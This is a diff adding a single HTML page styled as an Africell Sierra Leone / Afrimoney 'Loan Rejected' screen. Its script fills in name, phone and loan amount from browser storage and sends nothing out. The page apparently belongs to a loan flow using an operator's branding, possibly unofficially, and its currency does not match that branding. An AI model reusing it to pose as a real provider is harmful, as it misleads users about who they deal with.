@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#991676">
+
+<title>Loan Rejected | Africell Sierra Leone</title>
+
+<style>
+    body::-webkit-scrollbar {
+        display: none;
+    }
+    body {
+        scrollbar-width: none;
+    }
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+    width: 100%;
+    height: 100%;
+    background: #FFFFFF;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    padding: 0;
+    color: #1F2937;
+    perspective: 1100px;
+}
+
+.e-fullscreen-wrapper {
+    width: 100%;
+    max-width: 100%;
+    height: 100%;
+    max-height: 100%;
+    background: linear-gradient(180deg, #FFFFFF 0%, #FDF7FC 55%, #F8EEF6 100%);
+    padding: 28px 22px 22px 22px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    gap: 14px;
+    overflow-y: auto;
+    animation: slideUp .65s cubic-bezier(0.22, 1, 0.36, 1);
+}
+
+@keyframes slideUp {
+    from {
+        opacity: 0;
+        transform: translateY(20px) rotateX(4deg);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0) rotateX(0deg);
+    }
+}
+
+.e-logo {
+    text-align: center;
+    font-size: 25px;
+    font-weight: 900;
+    letter-spacing: -0.5px;
+    text-transform: uppercase;
+    color: #991676;
+    text-shadow: 0 3px 8px rgba(153, 22, 118, 0.16);
+}
+
+.e-logo span {
+    color: #991676;
+}
+
+.e-logo small {
+    display: block;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: #6B7280;
+    margin-top: 4px;
+    text-shadow: none;
+}
+
+.hero-3d {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    transform-style: preserve-3d;
+}
+
+.e-reject-icon-3d {
+    width: 72px;
+    height: 72px;
+    border-radius: 24px;
+    background: linear-gradient(145deg, #FF4D56 0%, #D9141E 65%, #9E0B12 100%);
+    color: #FFFFFF;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 34px;
+    font-weight: 900;
+    box-shadow:
+        0 14px 26px rgba(227, 27, 35, 0.28),
+        0 5px 0 #890910,
+        inset 0 2px 3px rgba(255, 255, 255, 0.45);
+    transform: translateZ(18px) rotateX(6deg);
+    animation: float3d 3.4s ease-in-out infinite;
+}
+
+@keyframes float3d {
+    0%, 100% { transform: translateY(0px) rotateX(6deg) rotateY(-4deg); }
+    50% { transform: translateY(-5px) rotateX(8deg) rotateY(4deg); }
+}
+
+h1 {
+    font-size: 26px;
+    text-align: center;
+    color: #991676;
+    font-weight: 800;
+    text-shadow: 0 2px 6px rgba(153, 22, 118, 0.12);
+}
+
+.e-status-badge {
+    text-align: center;
+}
+
+.e-status-3d {
+    display: inline-block;
+    background: linear-gradient(145deg, #FFF1F2, #FFE4E6);
+    border: 1px solid rgba(227, 27, 35, 0.3);
+    color: #D9141E;
+    padding: 8px 20px;
+    border-radius: 999px;
+    font-size: 12.5px;
+    font-weight: 800;
+    letter-spacing: 0.6px;
+    box-shadow:
+        0 8px 16px rgba(227, 27, 35, 0.14),
+        0 3px 0 rgba(227, 27, 35, 0.18),
+        inset 0 1px 0 #FFFFFF;
+}
+
+.e-details-3d {
+    width: 100%;
+    max-width: 440px;
+    margin: 0 auto;
+    background: linear-gradient(165deg, #FFFFFF 0%, #F7F8FA 100%);
+    border: 1px solid #E5E7EB;
+    border-radius: 20px;
+    padding: 16px 18px;
+    box-shadow:
+        0 14px 28px rgba(31, 41, 55, 0.08),
+        0 4px 0 #E5E7EB,
+        inset 0 1px 0 #FFFFFF;
+    transform: translateZ(10px);
+}
+
+.e-detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 12px;
+    padding: 9px 0;
+    border-bottom: 1px solid #E5E7EB;
+    font-size: 13px;
+}
+
+.e-detail-row:last-child {
+    border-bottom: none;
+}
+
+.e-detail-row span {
+    color: #6B7280;
+    font-weight: 500;
+}
+
+.e-detail-row strong {
+    color: #1F2937;
+    text-align: right;
+    overflow-wrap: anywhere;
+    font-weight: 700;
+}
+
+.e-message-3d {
+    width: 100%;
+    max-width: 440px;
+    margin: 0 auto;
+    background: linear-gradient(160deg, #FFFFFF 0%, #FAF2F8 100%);
+    border: 1px solid rgba(153, 22, 118, 0.2);
+    border-radius: 20px;
+    padding: 16px 18px;
+    line-height: 1.55;
+    color: #374151;
+    font-size: 12.8px;
+    box-shadow:
+        0 14px 26px rgba(153, 22, 118, 0.11),
+        0 4px 0 rgba(153, 22, 118, 0.16),
+        inset 0 1px 0 #FFFFFF;
+}
+
+.e-message-3d p {
+    margin-bottom: 0;
+}
+
+.e-footer {
+    text-align: center;
+    color: #9CA3AF;
+    font-size: 10px;
+    line-height: 1.6;
+    border-top: 1px solid #E5E7EB;
+    padding-top: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="e-fullscreen-wrapper">
+
+    <div class="e-logo">
+        Africell <span>Sierra Leone</span>
+        <small>AFRIMONEY FINANCIAL SERVICES</small>
+    </div>
+
+    <div class="hero-3d">
+        <div class="e-reject-icon-3d">✕</div>
+        <h1>Request Rejected</h1>
+        <div class="e-status-badge">
+            <div class="e-status-3d">✕ REJECTED</div>
+        </div>
+    </div>
+
+    <div class="e-details-3d">
+        <div class="e-detail-row">
+            <span>👤 Name</span>
+            <strong id="applicant">Applicant</strong>
+        </div>
+
+        <div class="e-detail-row">
+            <span>📱 Number</span>
+            <strong id="phone">Not provided</strong>
+        </div>
+
+        <div class="e-detail-row">
+            <span>💰 Loan Amount</span>
+            <strong id="amount">Not provided</strong>
+        </div>
+
+        <div class="e-detail-row">
+            <span>📋 Status</span>
+            <strong style="color:#D9141E;">Rejected</strong>
+        </div>
+    </div>
+
+    <div class="e-message-3d">
+        <p>We regret to inform you that your loan application was not approved at this time. Following our eligibility and financial assessment, your application did not meet the required lending criteria. Make sure you have at least <strong>D100.00</strong> in Your Account wallet to improve your limit and You may reapply later. We appreciate your understanding.</p>
+    </div>
+
+    <div class="e-footer">
+        Thank you for choosing Africell Sierra Leone ❤️
+        <br>
+        © 2026 Africell Sierra Leone. All Rights Reserved.
+    </div>
+
+</div>
+
+<script>
+function getValue(key, fallback) {
+    try {
+        return localStorage.getItem(key) || fallback;
+    } catch (error) {
+        return fallback;
+    }
+}
+
+const name = getValue('africellUserName', getValue('userFullName', 'Applicant'));
+const phone = getValue('africellUserPhone', getValue('userPhone', 'Not provided'));
+const amount = getValue('africellLoanAmount', getValue('loanAmount', 'Not provided'));
+
+document.getElementById('applicant').textContent = name;
+document.getElementById('phone').textContent = phone;
+document.getElementById('amount').textContent = amount;
+</script>
+
+</body>
+</html>
